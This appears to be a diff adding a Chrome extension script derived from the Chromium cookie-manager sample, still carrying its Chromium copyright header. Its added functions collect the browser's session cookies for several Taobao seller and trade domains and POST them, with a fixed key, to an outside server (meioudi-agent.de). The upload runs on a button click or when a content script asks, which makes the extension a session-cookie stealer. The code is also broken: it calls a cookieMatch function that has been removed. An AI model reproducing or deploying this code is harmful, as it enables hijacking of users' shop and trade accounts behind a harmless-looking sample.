@@ -1,0 +1,183 @@
+// Copyright (c) 2012 The Chromium Authors. All rights reserved.
+// Use of this source code is governed by a BSD-style license that can be
+// found in the LICENSE file.
+if (!chrome.cookies) {
+    chrome.cookies = chrome.experimental.cookies;
+}
+// A simple Timer class.
+function Timer() {
+    this.start_ = new Date();
+    this.elapsed = function() {
+        return (new Date()) - this.start_;
+    }
+    this.reset = function() {
+        this.start_ = new Date();
+    }
+}
+// Compares cookies for "key" (name, domain, etc.) equality, but not "value"
+// equality.
+
+// Returns an array of sorted keys from an associative array.
+function sortedKeys(array) {
+    var keys = [];
+    for (var i in array) {
+        keys.push(i);
+    }
+    keys.sort();
+    return keys;
+}
+// Shorthand for document.querySelector.
+function select(selector) {
+    return document.querySelector(selector);
+}
+// An object used for caching data about the browser's cookies, which we update
+// as notifications come in.
+function CookieCache() {
+    this.cookies_ = {};
+    this.reset = function() {
+        this.cookies_ = {};
+    }
+    this.add = function(cookie) {
+        var domain = cookie.domain;
+        if (!this.cookies_[domain]) {
+            this.cookies_[domain] = [];
+        }
+        this.cookies_[domain].push(cookie);
+    };
+    this.remove = function(cookie) {
+        var domain = cookie.domain;
+        if (this.cookies_[domain]) {
+            var i = 0;
+            while (i < this.cookies_[domain].length) {
+                if (cookieMatch(this.cookies_[domain][i], cookie)) {
+                    this.cookies_[domain].splice(i, 1);
+                } else {
+                    i++;
+                }
+            }
+            if (this.cookies_[domain].length == 0) {
+                delete this.cookies_[domain];
+            }
+        }
+    };
+    // Returns a sorted list of cookie domains that match |filter|. If |filter| is
+    //  null, returns all domains.
+    this.getDomains = function(filter) {
+        var result = [];
+        sortedKeys(this.cookies_).forEach(function(domain) {
+            if (!filter || domain.indexOf(filter) != -1) {
+                result.push(domain);
+            }
+        });
+        return result;
+    }
+    this.getCookies = function(domain) {
+        return this.cookies_[domain];
+    };
+}
+var cache = new CookieCache();
+
+function getCookieForTransfer(){
+    var cookie_store = new Array();
+    var cookie_real = '';
+    var cookie_fetch_from = new Array(".taobao.com", "myseller.taobao.com", "sell.taobao.com", "upload.taobao.com", "trade.taobao.com", "wuliu.taobao.com");
+    var domains = cache.getDomains("");
+    console.log(domains);
+    domains.forEach(function(domain) {
+        var cookies = cache.getCookies(domain);
+        if(cookie_fetch_from.indexOf(domain) >=0) {
+            cookie_store.push(JSON.stringify(cookies));
+        }
+    });
+    if(cookie_store.length <= 1){
+        return cookie_store[0];
+    }
+    cookie_real = cookie_store[0].substr(0,cookie_store[0].length-1)+",";
+    for(i = 1;i<cookie_store.length-1;i++){
+        cookie_real += cookie_store[i].substr(1, cookie_store[i].length-2)+",";
+    }
+    cookie_real += cookie_store[cookie_store.length-1].substr(1,cookie_store[cookie_store.length-1].length-1);
+    return cookie_real;
+}
+
+function transferCookie(){
+    var content = getCookieForTransfer();
+    var formData = new FormData();
+    formData.append('cookie', content);
+    formData.append("public_key", "tgjewiopfvv3qu5094g5u6093i4ui");
+    var xhr = new XMLHttpRequest();
+    //使用HTTP POST请求与服务器交互数据
+    xhr.open("POST", "http://meioudi-agent.de/jsapi", true);
+    // xhr.open("POST", "http://agent.meioudi.com/jsapi", true);
+    //设置发送数据的请求格式
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            //根据服务器的响应内容格式处理响应结果
+            // if(xhr.getResponseHeader('content-type')==='application/json'){
+            //     var result = JSON.parse(xhr.responseText);
+            //     //根据返回结果判断验证码是否正确
+            //     if(result.code===-1){
+            //         alert('验证码错误');
+            //     }
+            // } else {
+            //     console.log(xhr.responseText);
+            // }
+            console.log(xhr.responseText);
+        }
+    }
+    xhr.send(formData);
+}
+
+function focusFilter() {
+    select("#filter").focus();
+}
+
+function getIfValidSentCookieTime(){
+    if(localStorage.getItem("sent_time") == undefined){
+        timestamp = new Date().getTime();
+        localStorage.setItem("sent_time", timestamp);
+        return true;
+    }else{
+        if(new Date().getTime() - localStorage.getItem("sent_time") > 60000){
+            return true;
+        }
+        return false;
+    }
+}
+
+
+function onload() {
+    var timer = new Timer();
+    chrome.cookies.getAll({}, function(cookies) {
+        start = new Date();
+        for (var i in cookies) {
+            cache.add(cookies[i]);
+        }
+        timer.reset();
+    });
+
+}
+document.addEventListener('DOMContentLoaded', function() {
+    onload();
+    document.querySelector("#get_all_btn").addEventListener("click", transferCookie);
+
+});
+
+chrome.extension.onRequest.addListener(
+    function(request, sender, sendResponse) {
+        console.log(sender.tab ?
+            "from a content script:" + sender.tab.url :
+            "from the extension");
+        if (request.greeting == "hello"){
+            if(getIfValidSentCookieTime()){
+                transferCookie();
+                sendResponse({farewell: "cookie sent"});
+            }else{
+                sendResponse({farewell: "too busy, waiting"});
+            }
+
+
+        }
+        else
+            sendResponse({}); // snub them.
+    });
